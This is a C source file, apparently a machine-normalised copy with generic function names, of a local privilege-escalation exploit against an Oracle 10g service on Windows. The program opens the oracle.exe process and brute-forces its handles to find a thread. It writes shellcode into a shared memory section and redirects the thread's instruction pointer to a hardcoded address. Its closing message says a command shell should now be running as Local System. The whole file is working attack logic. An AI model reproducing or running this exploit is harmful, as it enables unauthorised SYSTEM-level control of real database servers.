#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  char _TCHAR ;
struct TYPE_4__ {int Eip; int /*<<< orphan*/  ContextFlags; } ;
typedef  int HANDLE ;
typedef  int DWORD ;
typedef  TYPE_1__ CONTEXT ;
typedef  char CHAR ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  CONTEXT_CONTROL ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  DUPLICATE_SAME_ACCESS ; 
 scalar_t__ FUNC1 (int,int,int /*<<< orphan*/ ,int*,int /*<<< orphan*/ ,scalar_t__,int /*<<< orphan*/ ) ; 
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int,TYPE_1__*) ; 
 scalar_t__ FUNC4 (int,char*) ; 
 int FUNC5 (int /*<<< orphan*/ ,scalar_t__,int) ; 
 int /*<<< orphan*/  PROCESS_DUP_HANDLE ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (int,TYPE_1__*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 scalar_t__ FUNC9 (int) ; 
 scalar_t__ TRUE ; 
 int FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 

int FUNC12(int argc, _TCHAR* argv[])
{
	HANDLE hSrcHandle=0,hTgtHandle=0,hProcess=0;
	BOOL bSuccess=FALSE;
	DWORD pid,j;
	CHAR * oraSID;
	CONTEXT Context;

	if(!argv[1]||!argv[2]){
		FUNC11("Usage %s Oracle.exe PID SID , example: %s 453 orcl\n",argv[0],argv[0]);
		return 0;
	}

	oraSID= argv[2];
	pid=FUNC10(argv[1]);
	
	FUNC11("\nOpening oracle.exe PID: %d\n",pid);
	
	hProcess=FUNC5(PROCESS_DUP_HANDLE ,FALSE,pid);
	if(!hProcess){
		FUNC11("\nCouldn't open oracle.exe process\n");
		FUNC11("\nCheck Oracle PID\n");
		return 0;
	}

	//brute force handles to find a thread one
	for (j=0x200;j<=0x1000;j+=4){
		hSrcHandle=(HANDLE)j;
		//get a local handle
		if(FUNC1(hProcess,hSrcHandle,FUNC2(),&hTgtHandle,0,FALSE,DUPLICATE_SAME_ACCESS )){
			//if we can suspend it then it's a thread handle
			if(FUNC9(hTgtHandle)==0){
				FUNC11("Found thread handle: 0x%x\n",hSrcHandle);
				//get thread control registers
				Context.ContextFlags = CONTEXT_CONTROL;
				FUNC3(hTgtHandle, &Context);
				//put shellcode on the shared section
				if (FUNC4(Context.Eip,oraSID)){
					FUNC11("Changing thread context...\n");

					//10gR1 section base address 0x04620000 on some systems
					//10gR2 section base address 0x048a0000 on some systems
					Context.Eip = 0x048a0500; //set new IP, add 0x500 to not overwrite data already 
											 //in the section, we don't want to crash Oracle service :)

					FUNC7(hTgtHandle, &Context); //change context to jump to shellcode
					FUNC6(hTgtHandle);

					FUNC11("Running exploit...\n");
					bSuccess=TRUE;

					FUNC8(2000);
				}
				else
					bSuccess=FALSE;
				
				FUNC0(hTgtHandle);
				break;

			}
			FUNC0(hTgtHandle);
		}		
	}	

	if (bSuccess)
		FUNC11("\nYou should have a command shell running as Local System :)\n");
	else
	{
		FUNC11("\nCheck Oracle SID\n");
	}

	FUNC0(hProcess);
	return 0;
}